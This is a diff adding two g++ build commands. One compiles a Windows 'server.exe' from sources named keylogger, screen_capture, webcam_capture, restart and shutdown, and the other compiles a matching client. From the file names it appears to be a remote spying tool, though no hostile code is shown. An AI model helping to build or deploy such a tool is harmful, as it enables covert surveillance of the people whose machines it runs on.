@@ -1,0 +1,2 @@
+g++ ../sources/server.cpp ../sources/process_utils.cpp ../sources/keylogger.cpp ../sources/restart.cpp ../sources/shutdown.cpp ../sources/screen_capture.cpp ../sources/webcam_capture.cpp -o server.exe -lws2_32 -lgdi32 -luser32 -lvfw32
+g++ ../sources/client.cpp -o client.exe -lws2_32
